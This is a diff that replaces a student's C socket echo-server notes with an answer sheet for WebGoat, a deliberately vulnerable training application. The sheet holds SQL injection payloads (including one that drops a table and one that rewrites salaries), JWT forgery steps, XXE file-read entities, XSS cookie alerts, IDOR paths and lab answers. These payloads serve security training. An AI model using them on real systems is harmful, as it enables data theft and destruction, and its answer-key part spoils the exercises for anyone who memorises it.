@@ -1,165 +1,143 @@
-# cn
-https://vcansimplify.wordpress.com/2013/03/14/c-socket-tutorial-echo-server/  
+A1-INTRO
 
-**tcpsever** 
+2)select department from employees where first_name=’Bob';
+3)update employees set department=’Sales’ where first_name=’Tobi’;
+4)alter table employees add phone varchar(20) ;
+5) grant all on grant_rights to unauthorized_user;
+9)Smith’ or ‘1’=’1
+10) Login count: 0
+User_Is: 0 or 1=1
+11) Employee name: A
+Authentication Tan: ‘ or ‘1’ =  ‘1
+12)Employee name : A
+Authentication Tan: ‘; Update employees set salary=99999 where first_name=’John
+13) %’; Drop Table access_log;--
 
-#include <sys/types.h>
-#include <sys/socket.h>
-#include <netdb.h>
-#include <stdio.h>
-#include<string.h>
-int main()
-{
-char str[100];
-int listen_fd, comm_fd;
-struct sockaddr_in servaddr;
-listen_fd = socket(AF_INET, SOCK_STREAM, 0);
-bzero( &servaddr, sizeof(servaddr));
-servaddr.sin_family = AF_INET;
-servaddr.sin_addr.s_addr = htons(INADDR_ANY);
-servaddr.sin_port = htons(22000);
-bind(listen_fd, (struct sockaddr *) &servaddr, sizeof(servaddr));
-listen(listen_fd, 10);
-comm_fd = accept(listen_fd, (struct sockaddr*) NULL, NULL);
-while(1)
-{
-bzero( str, 100);
-read(comm_fd,str,100);
-printf("Echoing back - %s",str);
-write(comm_fd, str, strlen(str)+1);
+A1-ADVANCED:
+
+3)Name:     ‘; select * from user_system_data;-- 
+Password: 
+5)username: tom
+password: thisisasecretfortomonly
+6)4,3,2,3,4
+
+A1- MITIGATION:
+
+5) 
+1 st box: getConnection
+2: PreparedStatement
+3: prepareStatement
+4: ? 
+5:?
+6: setString
+7: setString
+
+6) try {  
+     Connection conn = DriverManager.getConnection(DBURL, DBUSER, DBPW);  
+     PreparedStatement ps = conn.prepareStatement("SELECT * FROM users WHERE name = ?");  
+     ps.setString(1, "Admin");  
+     ps.executeUpdate();  
+} catch (Exception e) {  
+     System.out.println("Oops. Something went wrong!");  
 }
-4
-} 
+9) a’;/**/select/**/*/**/from/**/user_system_data;--
 
-**tcpclient** 
+10) a';/**/seselectlect/**/*/**/frfromom/**/user_system_data;--
 
-#include <sys/types.h>
-#include <sys/socket.h>
-#include <netdb.h>
-#include <stdio.h>
-#include<string.h>
-int main(int argc,char **argv)
-{
-int sockfd,n;
-char sendline[100];
-char recvline[100];
-struct sockaddr_in servaddr;
-sockfd=socket(AF_INET,SOCK_STREAM,0);
-bzero(&servaddr,sizeof servaddr);
-servaddr.sin_family=AF_INET;
-servaddr.sin_port=htons(22000);
-inet_pton(AF_INET,"127.0.0.1",&(servaddr.sin_addr));
-connect(sockfd,(struct sockaddr *)&servaddr,sizeof(servaddr));
-while(1)
-5
-{
-bzero( sendline, 100);
-bzero( recvline, 100);
-fgets(sendline,100,stdin); /*stdin = 0 , for standard input */
-write(sockfd,sendline,strlen(sendline)+1);
-read(sockfd,recvline,100);
-printf("%s",recvline);
-}
-} 
-
-**udpserver**
-
-#include<sys/types.h>
-#include<sys/socket.h>
-#include<stdio.h>
-#include<netinet/in.h>
-#define MAX 100
-#define SERPORT 1090
-14
-#define SA struct sockaddr
-void str_echo(FILE*,int,SA*,socklen_t);
-int main(int argc,char** argv)
-{
-int sockfd;
-struct sockaddr_in servaddr,cliaddr;
-sockfd=socket(AF_INET,SOCK_DGRAM,0);
-bzero(&servaddr,sizeof(servaddr));
-servaddr.sin_family=AF_INET;
-servaddr.sin_addr.s_addr=htonl(0);
-servaddr.sin_port=htons(SERPORT);
-bind(sockfd,(SA*)&servaddr,sizeof(servaddr));
-str_echo(stdin,sockfd,(SA*)&cliaddr,sizeof(cliaddr));
-exit(0);
-}
-void str_echo(FILE* fp,int sockfd,SA* cliaddr,socklen_t clilen)
-{
-char msg[MAX],send[MAX];
-int n;
-while(1)
-{
-if((n=recvfrom(sockfd,msg,MAX,0,cliaddr,&clilen))>0)
-{
-msg[n]='\0';
-printf("Client msg : ");
-15
-fputs(msg,stdout);
-printf("SERVER msg : ");
-fgets(msg,MAX,fp);
-sendto(sockfd,msg,strlen(msg),0,cliaddr,clilen);
-}
-}
-}
-
-**udpclient** 
-
-#include<sys/types.h>
-#include<sys/socket.h>
-#include<stdio.h>
-#include<netinet/in.h>
-#define MAX 100
-#define SERPORT 1090
-#define SA struct sockaddr
-void str_cli(FILE*,int,SA*,socklen_t);
-int main(int argc,char** argv)
-{
-int sockfd;
-struct sockaddr_in servaddr;
-sockfd=socket(AF_INET,SOCK_DGRAM,0);
-bzero(&servaddr,sizeof(servaddr));
-servaddr.sin_family=AF_INET;
-16
-servaddr.sin_addr.s_addr=inet_addr("127.0.0.1");
-servaddr.sin_port=htons(SERPORT);
-printf("Client msg : ");
-str_cli(stdin,sockfd,(SA*)&servaddr,sizeof(servaddr));
-exit(0);
-}
-void str_cli(FILE* fp,int sockfd,SA* seraddr,socklen_t len)
-{
-char msg[MAX],rcv[MAX];
-int n;
-while(fgets(msg,MAX,fp)!=NULL)
-{
-sendto(sockfd,msg,MAX,0,seraddr,len);
-if((n=recvfrom(sockfd,rcv,MAX,0,seraddr,&len))>0)
-{
-rcv[n]='\0';
-fputs(rcv,stdout);
-}
-printf("Client msg : ");
-}
-} 
+12)104.130.219.202
 
 
 
 
 
+A2:
+
+Authentication Bypass:
+
+submit-owasp-post- instead of 0,1 put 2,3 in secquestion
+
+JWT:
+
+3) user
+5) change user to tom and click delete
+owasp- copy the first token and paste in encode, decode hash then copy the decode and paste change it to “None”
+the copy the encode and paste it in manual editor
+
+then copy the second token and paste it in encode/decode copy the decode change false to true and paste and then copy the encode and paste it in manual editor
+put semicolon and send
+
+7) 1,3
+10) open in new browser , jwt.io, eposh convertor and clike the here link in question
+copy the token in the here link and paste it in jwt.io, then go to epoach convertor and copy the token and paste it in jwt token 
+then copy the code upto violet color and go to webgoat and click checkout and go to owasp
+in that instaed of Bearer null , delete the null and paste it
+
+11)
+in tom click delete then owasp-copy the tocken
+
+paste the token in jwt.io 
+go to webgoat in show hints search the hacked' UNION select 'deletingTom' from INFORMATION_SCHEMA.SYSTEM_USERS – and paste it in jwt instead of kid and chage the hacked to abc and change the deleting tom to xyz 
+then go to encode/decode hash paste xyz and copy the encode and paste it in jwt.token instead of xyz
+
+copy the code and paste it manual editor
+
+PASSWORD RESET
+
+2) CLICK FORGET PASSWORDand go to webwolf and check the pwd
+4)admin,green
+5)  what is your favorite color
+
+SECURE PASSWORD:
+give password sanka2@123#
 
 
 
 
-ping -ping google.com  
-tcpdump - sudo tcpdump -D 
+A3:
 
-traceroute - sudo traceroute/ traceroute google.com 
+Username: CaptainJack
+Password: BlackPearl
 
-netstat - sudo netstat -tnlp/netstat -r 
+A4:
 
-ipconfig - ip addr/ ip link show 
+4) <?xml version="1.0"?><!DOCTYPE comment [<!ENTITY xxe SYSTEM "file:///">]><comment>  <text>&xxe;</text></comment>
+7) <?xml version="1.0"?><!DOCTYPE comment [<!ENTITY xxe SYSTEM "file:///">]><comment>  <text>&xxe;</text></comment>
+ and above in application/json  instad of json type xml
+
+A5:
+
+2)  username:tom pass:cat
+3)role,userid
+4)WebGoat/IDOR/profile/2342384
+
+2) Users, Config
+
+A7:
+
+2) 
+Go to Downloads-> more tools-> web developer fools console will open
+In console type, alert(document.cookie) ;
+It will show alert msg click ok then again type 
+Alert(document.cookie) ;
+ Then in the 2 nd exercise type YES and click Submit
+7) 
+In that shopping cart
+In enter your credit card : remove that number
+Type <script>alert(“username”) </script>
+Example <script>alert(“sankamethra”) </script>
+10) 
+Type, start.mvc#test/ and click submit
+11) 
+In console, type
+Webgoat.custom js.phoneHome() 
+We can see the response code like -236547
+Copy and paster and click submit
+12) 
+Quiz
+1) Solution 4
+2) Solution 3
+3) Solution 1
+4) Solution 2
+5) Solution 4
 
 
